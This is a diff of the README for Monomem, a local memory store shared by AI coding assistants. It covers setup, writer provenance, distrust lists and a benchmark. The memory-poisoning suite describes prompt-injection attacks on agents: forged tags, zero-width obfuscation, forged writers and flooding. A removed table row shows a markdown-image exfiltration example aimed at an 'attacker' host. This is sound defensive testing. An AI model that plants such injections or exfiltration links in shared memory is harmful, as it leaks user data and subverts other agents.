@@ -14,13 +14,7 @@ file, over MCP or plain REST. No API keys, no cloud, no hidden model calls.
 
 ![One writer stores a note; a second, separately authenticated writer reads it back and can show who wrote it](https://raw.githubusercontent.com/calasdan-sketch/monomem/main/docs/monomem-demo.gif)
 
-*Reconstructed from a real two-writer run against one store. The note, the
-server-stamped `written_by`, and the 255 ms read are reproduced exactly from
-[`docs/brand/demo-transcript.txt`](https://github.com/calasdan-sketch/monomem/blob/main/docs/brand/demo-transcript.txt).
-The two sides are two separately authenticated write tokens, not two recorded
-vendor clients; the provenance is real, the client names illustrate the use
-case. Frames are rendered rather than screen-captured so the text is legible
-at this size, and nothing is sped up. Regenerate from a git checkout with `npm run demo-gif` (needs ffmpeg).*
+*Rendered from a real two-writer run against one store ([transcript](https://github.com/calasdan-sketch/monomem/blob/main/docs/brand/demo-transcript.txt)): two separately authenticated tokens, real server-stamped `written_by`, nothing sped up.*
 
 Tell one assistant something; every other assistant already knows it. Write a
 note in Claude Code, read it back in Cursor, Gemini CLI or Codex — one store,
@@ -36,8 +30,7 @@ web access).
 
 ## Quickstart
 
-> **Requires Node.js 22.16 or newer** (22.16+ or 24 LTS). Monomem uses Node's
-> built-in `node:sqlite`, which arrived in 22.5 but needed a flag until 22.16. Check with `node -v`. Can't
+> **Requires Node.js 22.16 or newer** (22.16+ or 24 LTS). Check with `node -v`. Can't
 > upgrade? Use [Docker](#docker) instead.
 
 ### Install in 60 seconds
@@ -50,8 +43,7 @@ npx monomem setup
 lines it will change, saves a backup of each file, and writes only after you type `y`. Then it writes a first test note, reads it
 back, runs `monomem doctor` and tells you how to check it inside Claude Code (type `/mcp`). To look first: `npx monomem setup
 --dry-run`. To go back: `monomem setup --undo`. It changes only the Monomem entry; your other servers and settings stay as they
-are. **Coming from claude-bridge** (the old name)? It offers to move that entry across and keeps your data. Step by step, with
-troubleshooting: [docs/live-claude-code.md](./docs/live-claude-code.md).
+are. Step by step, with troubleshooting: [docs/live-claude-code.md](./docs/live-claude-code.md).
 
 Already have notes in Claude Code? `monomem import --claude --dry-run` shows what could be brought in from your `CLAUDE.md` files and
 Claude Code's auto memory (secrets are skipped, nothing leaves your computer). Coming from claude-mem, mem0 or basic-memory?
@@ -98,9 +90,8 @@ package, so `npm update` and npx cache cleanups never touch it. Set
 `MONOMEM_HOME` to put it elsewhere, or `MONOMEM_DB_PATH` for just the
 database. On macOS/Linux the folder is owner-only (`0700`, files `0600`).
 A from-source git checkout that already has `./data/state.db` keeps using
-it. `monomem doctor` shows which directory is in use.
-
-**Upgrading from an early 1.0.x install** (data kept inside the package folder): copy it yourself before removing the old package, e.g. `mkdir -p ~/.monomem && cp -Rn "$(npm root -g)/monomem/data/." ~/.monomem/` (Windows: `%APPDATA%\npm\node_modules\monomem\data\*` to `%USERPROFILE%\.monomem\`), then run `monomem rebuild-edges` once.
+it. `monomem doctor` shows which directory is in use. Upgrading or moving from another tool:
+[docs/upgrading.md](./docs/upgrading.md), [docs/switching.md](./docs/switching.md).
 
 ### Docker
 
@@ -406,16 +397,16 @@ A note written by Claude Code and one written by Cursor are therefore no longer
 identical on read-back. MCP results add a "who wrote this" block under the untrusted-data
 banner, the session-start recall names the writer, and `state_list`, `state_search` and
 `memory_since` take `written_by` / `not_written_by` (REST: `?written_by=`) so an agent can
-ignore its own writes or distrust a client. Rows from before 1.3.3 read `""` (unknown).
+ignore its own writes or distrust a client.
 Details and limits: [docs/provenance.md](./docs/provenance.md).
 
-**Trust (1.4.0, hardened in 1.4.1).** `writer_id` (`<server_id>/<label>`) says which server a label came from. An admin can put a
+**Trust.** `writer_id` (`<server_id>/<label>`) says which server a label came from. An admin can put a
 writer on a per-namespace **distrust list** (`monomem trust distrust <writer> --namespace work`, the
 `trust_policy` MCP tool, `/trust` REST): its notes, tasks, handoffs and feed entries are then left out of every
 read path unless an **admin** passes `include_distrusted`, they stay hidden after anyone else edits them, and a
-distrusted command task is never run. A JSON export made with `--attest` (`?attest=1`; the default export is the
-plain `{"notes": [...]}` as in 1.3.x) carries a per-note Ed25519 **attestation**; an import that trusts the exporting server's key keeps the
-original author as `attested_writer`, otherwise it flattens provenance as before and marks the note `imported_unverified`. (Attestations are **EXPERIMENTAL** in 1.4.x.) What that proves and what it
+distrusted command task is never run. A JSON export made with `--attest` (`?attest=1`) carries a per-note Ed25519
+**attestation**; an import that trusts the exporting server's key keeps the original author as `attested_writer`,
+otherwise it marks the note `imported_unverified`. (Attestations are **experimental**.) What that proves and what it
 does not: [docs/trust.md](./docs/trust.md).
 
 ## Benchmark
@@ -429,11 +420,11 @@ It has five suites, as plain JSON scenario files you can extend in [`bench/scena
 |---|---|---|---|
 | A  Stale memory | 32 | a fact updated, replaced, deleted, aged: is the current value first and the old one never shown (or flagged)? Includes the two-step replace (preview writes nothing; the code is single-use, expires, and is bound to one caller) | `stale-hit-rate@1/@5`, `current-recall@1` |
 | B  Contradiction recovery | 31 | writer A vs writer B, then a trusted correction; distrusting the bad writer; weak overwrite of a trusted note; restoring the trusted text from history; the trust guard on replacing | resolved to the correction, loser stays visible, overwrite protected |
-| C  Permission isolation | 27 | cross-tenant read/write/search/export/import/merge/sweep, token scopes, admin-only flags, signed imports, and (1.6.0) that one tenant cannot read another's history, preview, undo or reuse a confirmation code | `leakage-count` (must be 0), `unexpected-denials` |
+| C  Permission isolation | 27 | cross-tenant read/write/search/export/import/merge/sweep, token scopes, admin-only flags, signed imports, and that one tenant cannot read another's history, preview, undo or reuse a confirmation code | `leakage-count` (must be 0), `unexpected-denials` |
 | D  Provenance retention | 19 | source, writer, creator, timestamps, deletion deadline, confidence after export, import, merge, update | `fields-lost` |
 | E  Memory poisoning | 14 | injected or malicious memories never reach an agent as trusted content: prompt-injection (plain, forged tags, zero-width-obfuscated) is quarantined; a distrusted/low-trust writer cannot outrank or silently overwrite a trusted fact; secrets are redacted (capture) or blocked (write); a forged writer/namespace is stamped with the real one; an unsigned import cannot pose as verified; a captured web fetch is not trusted memory; SessionStart injection carries the untrusted-data banner and leaves distrusted notes out; mass near-duplicate flooding cannot bury the answer | `poison-reach-count` (must be 0) |
 
-**Retrieval quality (2.0.0).** `monomem bench --longmemeval` and `--locomo` score retrieval on the public datasets, with no model
+**Retrieval quality.** `monomem bench --longmemeval` and `--locomo` score retrieval on the public datasets, with no model
 and no judge (does the right conversation come back?). On one Windows PC, 2026-10-31:
 
 | Dataset | Search | Recall@5 | Recall@10 | Search time (p50) |
@@ -450,29 +441,12 @@ embeddings). It does not measure speed, scale or concurrency, and "0 leaks" mean
 not an audit. Details and the scenario format: [docs/BENCHMARK.md](./docs/BENCHMARK.md). Another memory system can be tested by
 writing a small adapter (write, update, delete, search, plus the actor: writer and namespace).
 
-**The five provenance fields, honestly.** Against the usual list (source, timestamp, confidence, tenant, deletion policy), at 1.6.0:
-*source*: partly (`written_by` / `created_by` are server-stamped and cannot be faked; the `source` field is only a claim);
-*timestamp*: yes (`created_at`, `updated_at`, kept through export and import, plus a staleness flag); *tenant*: yes (namespaces pinned
-to tokens, read grants); *deletion policy*: partly (per-note `forget_after`, archive and sweep, explicit admin delete; no per-tenant default
-or legal hold); *confidence*: **yes, as a claim** (an optional 0 to 1 value, labelled with who claimed it, kept through edits, export and import,
-and never used to override the trust rules; 1.5.0 dropped it silently).
+**Replacing a memory** is always two steps on every surface: a preview that changes nothing and shows exactly what would
+stop appearing in search, then a confirm with the preview's one-time code. Nothing is deleted, undo is one command, and every
+edit keeps the text it replaces. See [docs/replacing-memories.md](./docs/replacing-memories.md).
 
-**Replacing a memory (1.6.0).** Replacing an old note is always two steps, on every surface: a preview that changes nothing and shows
-"Are you sure you want to replace this?" with exactly what would stop appearing in search, then a confirm that needs the preview's one-time code.
-Nothing is deleted, undo is one command, and every edit now keeps the text it replaces (admin-only history with restore). See
-[docs/replacing-memories.md](./docs/replacing-memories.md).
-
-**Known gaps.** Scenarios that fail because Monomem lacks the behaviour are kept, marked, and listed here and in the report. They do not fail the run
-(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed, and so is the one the memory-poisoning suite found (`GAP-POISON-MDLINK`, 2.0.0). **None is open.**
-
-| Gap | What was missing | Status | Scenarios |
-|---|---|---|---|
-| `GAP-SUPERSEDE` | No "this replaces that" link: write a second note and leave the first, and search returned both, the old one often first. | **Fixed in 1.6.0**: two-step replace; the old note is kept, hidden, labelled, undoable. | A05, A06, A10, A20, B03 (now pass) |
-| `GAP-RECENCY` | A 200-day-old note with better keyword overlap could outrank the current one (flagged, but not second). | **Fixed in 1.6.0**: a stale twin stays behind its newer twin. | A11 (now passes) |
-| `GAP-HISTORY` | No version history of bodies; after a bad overwrite the trusted original was not recoverable from Monomem. | **Fixed in 1.6.0**: bounded, admin-only history with restore (restore is a new version). | B08, B09 (now pass) |
-| `GAP-REST-CAS` | The REST `PUT /notes/:id` ignored `if_rev`. | **Fixed in 1.5.0**: it takes `if_rev` and answers 409. | B16 (passes) |
-| `GAP-CONFIDENCE` | No confidence field; a client could send one but it was dropped silently. | **Fixed in 1.6.0**: optional, validated, labelled as a claim. | D10 (now passes) |
-| `GAP-POISON-MDLINK` | The write-time linter did not flag markdown images whose URL smuggles note data out (e.g. `![x](https://attacker/p?data=...)`); such a note was stored as ordinary memory. | **Fixed in 2.0.0**: a remote markdown image with a query string is held in quarantine; README badge hosts are exempt. | E11 (now passes) |
+**Known gaps:** none open. Scenarios for behaviour Monomem lacks are kept and marked rather than deleted; the history of
+each one and how it was fixed is in [docs/BENCHMARK.md](./docs/BENCHMARK.md#known-gaps-history), with the provenance-field breakdown.
 
 ## Security in one paragraph
 
@@ -496,8 +470,7 @@ limits: [SECURITY.md](./SECURITY.md),
 **About the retrieval eval.** `evals/cross-device-tasks.json` is 10 tasks over
 10 notes and lexically easy; its perfect score is a regression gate in CI,
 not evidence of retrieval quality. Keyword-only `state_search` scores 1.00
-recall@1 on it (0.70 before the 2.0.0 any-word fallback and the 2.1.1
-negation fix). See [docs/encryption-retention.md](./docs/encryption-retention.md#the-evaluation-set).
+recall@1 on it. See [docs/encryption-retention.md](./docs/encryption-retention.md#the-evaluation-set).
 
 ## Leaves no trace
 
@@ -518,7 +491,7 @@ remove it: [docs/footprint.md](./docs/footprint.md).
 | [docs/change-feed.md](./docs/change-feed.md) | `memory_since` / `GET /changes` |
 | [docs/tasks.md](./docs/tasks.md) | task board, claims, command tasks, handoffs, one-call catch-up |
 | [docs/memory-linter.md](./docs/memory-linter.md) | `MONOMEM_LINT`, detection rules, quarantine |
-| [docs/live-claude-code.md](./docs/live-claude-code.md) | `monomem setup` step by step, moving from claude-bridge, checking it in live Claude Code, troubleshooting |
+| [docs/live-claude-code.md](./docs/live-claude-code.md) | `monomem setup` step by step, checking it in live Claude Code, troubleshooting |
 | [docs/file-sync.md](./docs/file-sync.md) | Markdown export/import, `sync --git` (optionally sealed), GitHub and Syncthing workflows |
 | [docs/sessionstart-hook.md](./docs/sessionstart-hook.md) | automatic recall at Claude Code session start |
 | [docs/encryption-retention.md](./docs/encryption-retention.md) | at-rest encryption, retention (TTL + archive), retrieval visibility |
